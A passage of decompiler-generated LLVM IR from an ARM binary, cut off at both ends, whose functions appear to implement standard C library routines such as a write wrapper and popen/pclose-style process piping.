  %v2_cb9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cb9c, i32* @r4, align 4
  ret i32 %v0_cb98

; uselistorder directives
  uselistorder i32 %v2_cb78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb98, { 1, 0 }
}

define i32 @function_cba0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cba0:
  store i32 0, i32* @r3, align 4
  %v0_cba4 = call i32 @function_10fd8()
  ret i32 %v0_cba4
}

define i32 @function_cba8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_cba8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cba8 = load i32, i32* @r4, align 4
  store i32 %v3_cba8, i32* %stack_var_-8, align 4
  %v3_cbac = load i32, i32* @r2, align 4
  %v4_cbac = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_cbac)
  store i32 %v4_cbac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_cbac, -4095
  br i1 %tmp, label %dec_label_pc_cbcc, label %dec_label_pc_cbbc

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cba8
  %v0_cbbc = call i32 @function_cc08()
  %v0_cbc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_cbc0 = sub i32 0, %v0_cbc0
  %v2_cbc4 = inttoptr i32 %v0_cbbc to i32*
  store i32 %v1_cbc0, i32* %v2_cbc4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cbcc

dec_label_pc_cbcc:                                ; preds = %dec_label_pc_cba8, %dec_label_pc_cbbc
  %v0_cbcc = phi i32 [ %v4_cbac, %dec_label_pc_cba8 ], [ -1, %dec_label_pc_cbbc ]
  %v2_cbd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cbd0, i32* @r4, align 4
  ret i32 %v0_cbcc

; uselistorder directives
  uselistorder i32 %v4_cbac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cbcc, { 1, 0 }
}

define i32 @function_cbd4(i32 %arg1) local_unnamed_addr {
dec_label_pc_cbd4:
  %v1_cbdc = icmp slt i32 %arg1, 0
  br i1 %v1_cbdc, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_cbd4
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_cbd4
  %v2_cbdc = mul i32 %arg1, 2
  %v2_cbe8 = load i32, i32* @global_var_1f16c, align 4
  %v2_cbec = add i32 %v2_cbe8, %v2_cbdc
  %v3_cbf0 = inttoptr i32 %v2_cbec to i8*
  %v4_cbf0 = load i8, i8* %v3_cbf0, align 1
  %v6_cbf0 = zext i8 %v4_cbf0 to i32
  %v1_cbf4 = add i32 %v2_cbec, 1
  %v2_cbf4 = inttoptr i32 %v1_cbf4 to i8*
  %v3_cbf4 = load i8, i8* %v2_cbf4, align 1
  %v4_cbf4 = zext i8 %v3_cbf4 to i32
  %v3_cbf8 = mul nuw i32 %v4_cbf4, 16777216
  %v4_cbfc = sdiv i32 %v3_cbf8, 65536
  %v5_cbfc = or i32 %v4_cbfc, %v6_cbf0
  ret i32 %v5_cbfc

; uselistorder directives
  uselistorder i32 %v2_cbec, { 1, 0 }
}

define i32 @function_cc08() local_unnamed_addr {
dec_label_pc_cc08:
  ret i32 ptrtoint (i32* @global_var_21b40.268 to i32)
}

define i32 @function_cc14(i8* %arg1) local_unnamed_addr {
dec_label_pc_cc14:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_cc14 = load i32, i32* @r4, align 4
  store i32 %v3_cc14, i32* %stack_var_-32, align 4
  %v6_cc14 = load i32, i32* @r5, align 4
  %v9_cc14 = load i32, i32* @r6, align 4
  %v12_cc14 = load i32, i32* @r7, align 4
  %v15_cc14 = load i32, i32* @r8, align 4
  %v2_cc18 = add i32 %tmp, 52
  %v3_cc18 = inttoptr i32 %v2_cc18 to i32*
  %v4_cc18 = load i32, i32* %v3_cc18, align 4
  store i32 %v4_cc18, i32* @r8, align 4
  %v2_cc1c = add i32 %tmp, 56
  store i32 %v2_cc1c, i32* @r5, align 4
  %v2_cc20 = ptrtoint i32* %stack_var_-64 to i32
  %v2_cc24 = icmp eq i32 %v4_cc18, 0
  store i1 %v2_cc24, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_cc34 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_cc34, i32* @r0, align 4
  br i1 %v2_cc24, label %dec_label_pc_cc3c, label %dec_label_pc_cc58

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cc14
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_cc44 = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_cc54 = call i32 @function_10838()
  %v0_cc58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc58

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc14, %dec_label_pc_cc3c
  %v0_cc60 = phi i32 [ %tmp, %dec_label_pc_cc14 ], [ %v0_cc58.pre, %dec_label_pc_cc3c ]
  %v1_cc58 = inttoptr i32 %v0_cc60 to i8*
  %v2_cc58 = load i8, i8* %v1_cc58, align 1
  %v3_cc58 = zext i8 %v2_cc58 to i32
  %v1_cc5c = and i32 %v3_cc58, 64
  store i32 %v1_cc5c, i32* %r3.global-to-local, align 4
  %v2_cc5c = icmp eq i32 %v1_cc5c, 0
  store i1 %v2_cc5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cc5c, i32* @r7, align 4
  br i1 %v2_cc5c, label %dec_label_pc_cc74, label %dec_label_pc_cc6c

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc58
  %v3_cc6c = call i32 @function_e7a0(i8* %v1_cc58)
  store i32 %v3_cc6c, i32* @r7, align 4
  %v0_cc74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc74

dec_label_pc_cc74:                                ; preds = %dec_label_pc_cc58, %dec_label_pc_cc6c
  %v0_cc74 = phi i32 [ %v0_cc60, %dec_label_pc_cc58 ], [ %v0_cc74.pre, %dec_label_pc_cc6c ]
  %v1_cc74 = add i32 %v0_cc74, 4
  %v2_cc74 = inttoptr i32 %v1_cc74 to i32*
  %v3_cc74 = load i32, i32* %v2_cc74, align 4
  %v1_cc78 = call i32 @function_ca18(i32 %v3_cc74)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_cc80 = icmp slt i32 %v1_cc78, 0
  %v2_cc80 = icmp eq i32 %v1_cc78, 0
  store i1 %v2_cc80, i1* %cpsr_z.global-to-local, align 1
  %v1_cc84 = load i32, i32* @r4, align 4
  %v2_cc84 = add i32 %v1_cc84, 4
  %v3_cc84 = inttoptr i32 %v2_cc84 to i32*
  store i32 -1, i32* %v3_cc84, align 4
  store i32 %v2_cc20, i32* @r0, align 4
  br i1 %v1_cc80, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_cc74
  %v3_cc98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_cc98, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_cc74, %bb
  %v1_cca4 = call i32 @function_10840()
  %v1_ccb0 = call i32 @function_10838()
  %v2_ccb8 = load i32, i32* @global_var_1f91c.276, align 4
  %v1_ccbc = add i32 %v2_ccb8, 1
  store i32 %v1_ccbc, i32* %r3.global-to-local, align 4
  store i32 %v1_ccbc, i32* @global_var_1f91c.276, align 4
  store i32 %v2_cc20, i32* @r0, align 4
  %v1_ccd4 = call i32 @function_10840()
  %v0_ccd8 = load i32, i32* @r4, align 4
  %v1_ccd8 = inttoptr i32 %v0_ccd8 to i32*
  %v2_ccd8 = load i32, i32* %v1_ccd8, align 4
  %v1_ccdc = and i32 %v2_ccd8, 24576
  store i32 %v1_ccdc, i32* %r3.global-to-local, align 4
  %v3_cce01 = udiv i32 %v1_ccdc, 256
  %v1_cce4 = trunc i32 %v3_cce01 to i8
  %v3_cce4 = add i32 %v0_ccd8, 1
  %v4_cce4 = inttoptr i32 %v3_cce4 to i8*
  store i8 %v1_cce4, i8* %v4_cce4, align 1
  %v0_cce8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cce8 = trunc i32 %v0_cce8 to i8
  %v2_cce8 = load i32, i32* @r4, align 4
  %v3_cce8 = inttoptr i32 %v2_cce8 to i8*
  store i8 %v1_cce8, i8* %v3_cce8, align 1
  %v0_ccec = load i32, i32* @r4, align 4
  %v1_ccec = inttoptr i32 %v0_ccec to i32*
  %v2_ccec = load i32, i32* %v1_ccec, align 4
  %v1_ccf0 = or i32 %v2_ccec, 48
  store i32 %v1_ccf0, i32* %r3.global-to-local, align 4
  %v3_ccf4 = sdiv i32 %v2_ccec, 256
  %v0_ccf8 = load i32, i32* @r8, align 4
  %v2_ccf8 = icmp eq i32 %v0_ccf8, 0
  store i1 %v2_ccf8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_cc34, i32* @r0, align 4
  %v1_cd08 = trunc i32 %v3_ccf4 to i8
  %v3_cd08 = add i32 %v0_ccec, 1
  %v4_cd08 = inttoptr i32 %v3_cd08 to i8*
  store i8 %v1_cd08, i8* %v4_cd08, align 1
  %v0_cd0c = load i32, i32* %r3.global-to-local, align 4
  %v1_cd0c = trunc i32 %v0_cd0c to i8
  %v2_cd0c = load i32, i32* @r4, align 4
  %v3_cd0c = inttoptr i32 %v2_cd0c to i8*
  store i8 %v1_cd0c, i8* %v3_cd0c, align 1
  %v0_cd10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cd10, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_cd14 = call i32 @function_10840()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_cd18 = load i32, i32* @r4, align 4
  %v1_cd18 = add i32 %v0_cd18, 1
  %v2_cd18 = inttoptr i32 %v1_cd18 to i8*
  %v3_cd18 = load i8, i8* %v2_cd18, align 1
  %v4_cd18 = zext i8 %v3_cd18 to i32
  store i32 %v4_cd18, i32* %r3.global-to-local, align 4
  %v1_cd1c = and i32 %v4_cd18, 64
  %v2_cd1c = icmp eq i32 %v1_cd1c, 0
  store i1 %v2_cd1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cd1c, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_cd24 = xor i1 %v2_cd1c, true
  call void @__pseudo_cond_branch(i1 %v1_cd24, i32 ptrtoint (i32* @global_var_fa5c.278 to i32))
  store i32 %v2_cc20, i32* @r0, align 4
  %v1_cd38 = call i32 @function_10840()
  %v1_cd44 = call i32 @function_10838()
  %v2_cd4c = load i32, i32* @global_var_1f920.281, align 4
  %v1_cd50 = add i32 %v2_cd4c, 1
  store i32 %v1_cd50, i32* %r3.global-to-local, align 4
  store i32 %v2_cc20, i32* @r0, align 4
  store i32 %v1_cd50, i32* @global_var_1f920.281, align 4
  %v1_cd64 = call i32 @function_10840()
  %v1_cd68 = call i32 @function_e660(i32 %v1_cd64)
  %v0_cd6c = load i32, i32* @r7, align 4
  %v2_cd74 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_cd74, i32* @r4, align 4
  store i32 %v6_cc14, i32* @r5, align 4
  store i32 %v9_cc14, i32* @r6, align 4
  store i32 %v12_cc14, i32* @r7, align 4
  store i32 %v15_cc14, i32* @r8, align 4
  ret i32 %v0_cd6c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_cc74, { 1, 0 }
  uselistorder label %dec_label_pc_cc58, { 1, 0 }
}

define i32 @function_cd94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cd94:
  %v0_cd9c = load i32, i32* @r0, align 4
  %v1_cd9c = load i32, i32* @r1, align 4
  %v4_cd9c = inttoptr i32 %v1_cd9c to i8*
  %v5_cd9c = call i32 @function_d1dc(i32 %v0_cd9c, i8* %v4_cd9c, i32 0, i32 -1)
  ret i32 %v5_cd9c
}

define i32 @function_cda0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cda0:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_cdac = call i32 @function_cde4()
  ret i32 %v0_cdac
}

define i32 @function_cdb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cdb0:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_cdbc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_cdbc, i32* @ip, align 4
  store i32 %v2_cdbc, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_cdd0 = call i32 @function_cde4()
  ret i32 %v0_cdd0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_cde4() local_unnamed_addr {
dec_label_pc_cde4:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_cde4 = load i32, i32* @r4, align 4
  %v6_cde4 = load i32, i32* @r5, align 4
  %v12_cde4 = load i32, i32* @r7, align 4
  %v15_cde4 = load i32, i32* @r8, align 4
  %v18_cde4 = load i32, i32* @sl, align 4
  %v0_cde8 = load i32, i32* @r3, align 4
  store i32 %v0_cde8, i32* @r8, align 4
  %v2_cdec = ptrtoint i32* %stack_var_-108 to i32
  %v0_cdf4 = load i32, i32* @r0, align 4
  %v1_cdf4 = sub i32 -1, %v0_cdf4
  store i32 %v1_cdf4, i32* @r5, align 4
  store i32 %v0_cdf4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_ce08 = load i32, i32* @r1, align 4
  %v3_ce08 = icmp ult i32 %v1_cdf4, %v1_ce08
  br i1 %v3_ce08, label %bb23, label %bb

bb:                                               ; preds = %dec_label_pc_cde4
  store i32 %v1_ce08, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_cde4, %bb
  %v0_ce10 = load i32, i32* @r2, align 4
  store i32 %v0_ce10, i32* @r7, align 4
  %v2_ce14 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ce14, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_ce30 = call i32 @function_d544()
  %v0_ce34 = load i32, i32* @r4, align 4
  %v1_ce34 = load i32, i32* @r5, align 4
  %v2_ce34 = add i32 %v1_ce34, %v0_ce34
  %v0_ce3c = load i32, i32* @r7, align 4
  %v0_ce40 = load i32, i32* @r8, align 4
  %v0_ce4c = load i32, i32* @sl, align 4
  %v12_ce60 = inttoptr i32 %v0_ce3c to i8*
  %v13_ce60 = call i32 @function_d70c(i32 %v2_cdec, i8* %v12_ce60, i32 %v0_ce40, i32 %v2_ce34, i32 %v0_ce34, i32 %v2_ce34, i32 %v0_ce34, i32 %v0_ce34, i32 %v0_ce34, i32 %v2_ce34, i32 %v0_ce4c)
  %v0_ce64 = load i32, i32* @r5, align 4
  %v1_ce64 = load i32, i32* @sl, align 4
  %v9_ce64 = icmp eq i32 %v0_ce64, %v1_ce64
  br i1 %v9_ce64, label %dec_label_pc_ce8c, label %dec_label_pc_ce70

dec_label_pc_ce70:                                ; preds = %bb23
  %v9_ce78 = icmp eq i32 %v1_ce34, 0
  %v1_ce7c = sext i1 %v9_ce78 to i32
  %v1_ce7c.v0_ce44 = add i32 %v0_ce34, %v1_ce7c
  %stack_var_-92.0 = inttoptr i32 %v1_ce7c.v0_ce44 to i8*
  %v1_ce88 = trunc i32 %v1_ce64 to i8
  store i8 %v1_ce88, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %bb23, %dec_label_pc_ce70
  store i32 %v3_cde4, i32* @r4, align 4
  store i32 %v6_cde4, i32* @r5, align 4
  store i32 %v12_cde4, i32* @r7, align 4
  store i32 %v15_cde4, i32* @r8, align 4
  store i32 %v18_cde4, i32* @sl, align 4
  ret i32 %v13_ce60

; uselistorder directives
  uselistorder i32 %v1_ce34, { 1, 0 }
  uselistorder i32 %v0_ce34, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_ce08, { 1, 0 }
  uselistorder i32 %v0_cdf4, { 1, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @function_ce94(i32 %arg1) local_unnamed_addr {
dec_label_pc_ce94:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ce94 = load i32, i32* @r4, align 4
  %v2_ce98 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %v2_ce98, i32* @r0, align 4
  %v1_ceb4 = call i32 @function_10840()
  %v1_cec4 = call i32 @function_10838()
  %v2_cecc = load i32, i32* @global_var_1f918.288, align 4
  store i32 %v2_cecc, i32* %r4.global-to-local, align 4
  %v2_ced0 = icmp eq i32 %v2_cecc, 0
  br i1 %v2_ced0, label %dec_label_pc_cf18, label %dec_label_pc_cf04.preheader

dec_label_pc_cf04.preheader:                      ; preds = %dec_label_pc_ce94
  %v1_cf08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_cf04

dec_label_pc_cedc:                                ; preds = %dec_label_pc_cef4
  %v0_cedc = call i32 @function_cc08()
  %v2_cee4 = inttoptr i32 %v0_cedc to i32*
  store i32 22, i32* %v2_cee4, align 4
  br label %dec_label_pc_cf18

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cf48
  %v3_ceec = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_cf74

dec_label_pc_cef4:                                ; preds = %dec_label_pc_cf04
  %v1_cef8 = inttoptr i32 %v0_cf10 to i32*
  %v2_cef8 = load i32, i32* %v1_cef8, align 4
  store i32 %v2_cef8, i32* %r4.global-to-local, align 4
  %v2_cefc = icmp eq i32 %v2_cef8, 0
  br i1 %v2_cefc, label %dec_label_pc_cedc, label %dec_label_pc_cf04

dec_label_pc_cf04:                                ; preds = %dec_label_pc_cf04.preheader, %dec_label_pc_cef4
  %v1_cf14 = phi i32 [ ptrtoint (i32* @global_var_1f918.288 to i32), %dec_label_pc_cf04.preheader ], [ %v0_cf10, %dec_label_pc_cef4 ]
  %v0_cf10 = phi i32 [ %v2_cecc, %dec_label_pc_cf04.preheader ], [ %v2_cef8, %dec_label_pc_cef4 ]
  %v1_cf04 = add i32 %v0_cf10, 4
  %v2_cf04 = inttoptr i32 %v1_cf04 to i32*
  %v3_cf04 = load i32, i32* %v2_cf04, align 4
  %v9_cf08 = icmp eq i32 %v3_cf04, %v1_cf08.pre
  br i1 %v9_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cef4

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cf04
  %v1_cf10 = inttoptr i32 %v0_cf10 to i32*
  %v2_cf10 = load i32, i32* %v1_cf10, align 4
  %v2_cf14 = inttoptr i32 %v1_cf14 to i32*
  store i32 %v2_cf10, i32* %v2_cf14, align 4
  br label %dec_label_pc_cf18

dec_label_pc_cf18:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cedc, %dec_label_pc_cf10
  store i32 %v2_ce98, i32* @r0, align 4
  store i32 53036, i32* @lr, align 4
  %v1_cf28 = call i32 @function_10840()
  %v0_cf2c = load i32, i32* %r4.global-to-local, align 4
  %v2_cf2c = icmp eq i32 %v0_cf2c, 0
  br i1 %v2_cf2c, label %dec_label_pc_cf74, label %dec_label_pc_cf34

dec_label_pc_cf34:                                ; preds = %dec_label_pc_cf18
  %v1_cf38 = add i32 %v0_cf2c, 8
  %v2_cf38 = inttoptr i32 %v1_cf38 to i32*
  %v3_cf38 = load i32, i32* %v2_cf38, align 4
  store i32 %v3_cf38, i32* @r4, align 4
  %v1_cf3c = call i32 @function_fa5c(i32 %v0_cf2c)
  %v0_cf40 = load i32, i32* @r5, align 4
  %v1_cf44 = inttoptr i32 %v0_cf40 to i8*
  %v2_cf44 = call i32 @function_cc14(i8* %v1_cf44)
  %v2_cf48 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_cf48

dec_label_pc_cf48:                                ; preds = %dec_label_pc_cf60, %dec_label_pc_cf34
  store i32 %v2_cf48, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v0_cf50 = load i32, i32* @r4, align 4
  store i32 %v0_cf50, i32* @r0, align 4
  %v3_cf54 = call i32 @function_cba0(i32 %v0_cf50, i32 %v2_cf48, i32 0)
  %v1_cf58 = icmp slt i32 %v3_cf54, 0
  br i1 %v1_cf58, label %dec_label_pc_cf60, label %dec_label_pc_ceec

dec_label_pc_cf60:                                ; preds = %dec_label_pc_cf48
  %v0_cf60 = call i32 @function_cc08()
  %v1_cf64 = inttoptr i32 %v0_cf60 to i32*
  %v2_cf64 = load i32, i32* %v1_cf64, align 4
  %v7_cf68 = icmp eq i32 %v2_cf64, 4
  br i1 %v7_cf68, label %dec_label_pc_cf48, label %dec_label_pc_cf74

dec_label_pc_cf74:                                ; preds = %dec_label_pc_cf60, %dec_label_pc_cf18, %dec_label_pc_ceec
  %storemerge = phi i32 [ %v3_ceec, %dec_label_pc_ceec ], [ -1, %dec_label_pc_cf18 ], [ -1, %dec_label_pc_cf60 ]
  store i32 %v3_ce94, i32* %r4.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_cf2c, { 1, 0, 2 }
  uselistorder i32 %v0_cf10, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_cf18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
}

define i32 @function_cf94(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_cf94:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_cf94 = load i32, i32* @r4, align 4
  store i32 %v3_cf94, i32* %stack_var_-20, align 4
  %v16_cf94 = ptrtoint i32* %stack_var_-20 to i32
  %v3_cf98 = load i8, i8* %arg2, align 1
  %v4_cf98 = zext i8 %v3_cf98 to i32
  store i32 %v4_cf98, i32* %r3.global-to-local, align 4
  %v7_cfa0 = icmp eq i8 %v3_cf98, 119
  store i32 %tmp, i32* @r4, align 4
  %v0_cfa8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_cfa0, label %dec_label_pc_cfd8, label %dec_label_pc_cfb0

dec_label_pc_cfb0:                                ; preds = %dec_label_pc_cf94
  %v7_cfb0 = icmp eq i8 %v3_cf98, 114
  br i1 %v7_cfb0, label %bb, label %dec_label_pc_cfc0

bb:                                               ; preds = %dec_label_pc_cfb0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cfe0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_cfb0
  %v0_cfc0 = call i32 @function_cc08()
  store i32 %v0_cfc0, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_cfd0 = inttoptr i32 %v0_cfc0 to i32*
  store i32 22, i32* %v2_cfd0, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cf94
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cfe0

dec_label_pc_cfe0:                                ; preds = %bb, %dec_label_pc_cfd8
  %v0_d0ac = phi i32 [ 0, %dec_label_pc_cfd8 ], [ 1, %bb ]
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_cfe4 = call i32 @function_f908(i32 12)
  store i32 %v1_cfe4, i32* %r0.global-to-local, align 4
  %v2_cfe8 = icmp eq i32 %v1_cfe4, 0
  br i1 %v2_cfe8, label %dec_label_pc_d1ac, label %dec_label_pc_cff8

dec_label_pc_cff8:                                ; preds = %dec_label_pc_cfe0
  %v2_cff8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_cff8, i32* %r0.global-to-local, align 4
  %v1_cffc = call i32 @function_10f00(i32 %v2_cff8)
  store i32 %v1_cffc, i32* %r0.global-to-local, align 4
  %v2_d000 = icmp eq i32 %v1_cffc, 0
  br i1 %v2_d000, label %dec_label_pc_d008, label %dec_label_pc_d19c

dec_label_pc_d008:                                ; preds = %dec_label_pc_cff8
  store i32 %v16_cf94, i32* %r0.global-to-local, align 4
  %v1_d010 = xor i32 %v0_d0ac, 1
  store i32 -8, i32* @r2, align 4
  %tmp23 = sub nsw i32 0, %v1_d010
  %v4_d018 = and i32 %tmp23, 4
  %v5_d018 = add i32 %v4_d018, %v16_cf94
  store i32 %v5_d018, i32* %r3.global-to-local, align 4
  %v2_d01c = add i32 %v5_d018, -8
  %v3_d01c = inttoptr i32 %v2_d01c to i32*
  %v4_d01c = load i32, i32* %v3_d01c, align 4
  %tmp24 = sub nsw i32 0, %v0_d0ac
  %v4_d024 = and i32 %tmp24, 4
  %v5_d024 = add i32 %v4_d024, %v16_cf94
  store i32 %v5_d024, i32* %r3.global-to-local, align 4
  %v2_d028 = add i32 %v5_d024, -8
  %v3_d028 = inttoptr i32 %v2_d028 to i32*
  %v4_d028 = load i32, i32* %v3_d028, align 4
  store i32 %v4_d028, i32* %r3.global-to-local, align 4
  %v0_d02c = load i32, i32* @r4, align 4
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v7_d038 = call i32 @function_1113c(i32 %v4_d01c, i32 %v0_d02c, i32 -8, i32 %v4_d028, i32 %v4_d01c, i32 %v4_d028)
  store i32 %v7_d038, i32* %r0.global-to-local, align 4
  %v2_d03c = icmp eq i32 %v7_d038, 0
  br i1 %v2_d03c, label %dec_label_pc_d048, label %dec_label_pc_d05c

dec_label_pc_d048:                                ; preds = %dec_label_pc_d008
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v1_d04c = call i32 @function_ca18(i32 %v4_d01c)
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v1_d054 = call i32 @function_ca18(i32 %v4_d028)
  store i32 %v1_d054, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d19c

dec_label_pc_d05c:                                ; preds = %dec_label_pc_d008
  store i32 ptrtoint (i32* @global_var_1f900.283 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1f900.283 to i32), i32* %r2.global-to-local, align 4
  %v2_d068 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d068, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_d074 = call i32 @function_10840()
  %v0_d078 = load i32, i32* @r4, align 4
  store i32 %v0_d078, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_d084 = call i32 @function_10838()
  store i32 %v1_d084, i32* %r0.global-to-local, align 4
  %v1_d088 = call i32 @function_10c10(i32 %v1_d084)
  store i32 %v1_d088, i32* %r0.global-to-local, align 4
  store i32 %v1_d088, i32* @r5, align 4
  %v2_d08c = icmp eq i32 %v1_d088, 0
  br i1 %v2_d08c, label %dec_label_pc_d094, label %dec_label_pc_d104

dec_label_pc_d094:                                ; preds = %dec_label_pc_d05c
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v1_d098 = call i32 @function_ca18(i32 %v4_d01c)
  store i32 %v1_d098, i32* %r0.global-to-local, align 4
  store i32 %v0_d0ac, i32* %r2.global-to-local, align 4
  %v9_d0a4 = icmp eq i32 %v4_d028, %v0_d0ac
  br i1 %v9_d0a4, label %dec_label_pc_d0c0, label %dec_label_pc_d0ac

dec_label_pc_d0ac:                                ; preds = %dec_label_pc_d094
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v2_d0b4 = call i32 @function_10d60(i32 %v4_d028, i32 %v0_d0ac)
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v1_d0bc = call i32 @function_ca18(i32 %v4_d028)
  store i32 %v1_d0bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d0c0

dec_label_pc_d0c0:                                ; preds = %dec_label_pc_d094, %dec_label_pc_d0ac
  store i32 ptrtoint (i32* @global_var_1f918.288 to i32), i32* %r3.global-to-local, align 4
  %storemerge3 = load i32, i32* @global_var_1f918.288, align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_d0dc5 = icmp eq i32 %storemerge3, 0
  br i1 %v2_d0dc5, label %dec_label_pc_d0e4, label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d0c0, %dec_label_pc_d0cc
  %v0_d0cc = phi i32 [ %storemerge, %dec_label_pc_d0cc ], [ %storemerge3, %dec_label_pc_d0c0 ]
  %v1_d0cc = add i32 %v0_d0cc, 4
  %v2_d0cc = inttoptr i32 %v1_d0cc to i32*
  %v3_d0cc = load i32, i32* %v2_d0cc, align 4
